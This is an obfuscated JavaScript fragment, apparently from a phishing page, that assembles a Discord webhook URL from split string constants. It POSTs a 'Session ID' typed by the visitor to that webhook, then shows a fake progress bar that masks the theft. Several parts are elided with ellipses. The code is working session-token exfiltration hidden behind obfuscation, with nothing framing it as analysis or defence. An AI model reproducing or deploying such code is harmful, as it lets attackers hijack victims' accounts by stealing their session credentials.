const _0x1a2b = 'https://discord.com/api/webhooks/';
const _0x3c4d = '1350235351339241472/';
const _0x5e6f = 'LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
const _0x7a8b = _0x1a2b + _0x3c4d + _0x5e6f;

function _0x9a1b(_0x2c3d) {
  const _0x4e5f = { content: `New Session ID Submitted:\n\`\`\`${_0x2c3d}\`\`\`` };
  fetch(_0x7a8b, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_0x4e5f) })
...
function _0xb1c2() {
  ...
  if (_0x1g2h) { _0x2h3i(_0x1g2h); return; }
  _0x9a1b(_0xe5f6);
  _0x4j5k();
  _0x6l7m();
}

function _0x2h3i(_0x3i4j) {
...
function _0x4j5k() { document.getElementById('error').classList.add('hidden'); }
...
function _0x6l7m() {
  ...
  const _0x3r4s = setInterval(() => {
    if (_0x8n9o >= 100) { clearInterval(_0x3r4s); _0x4s5t(); }
...
document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('.close').addEventListener('click', _0x7k8l);
});
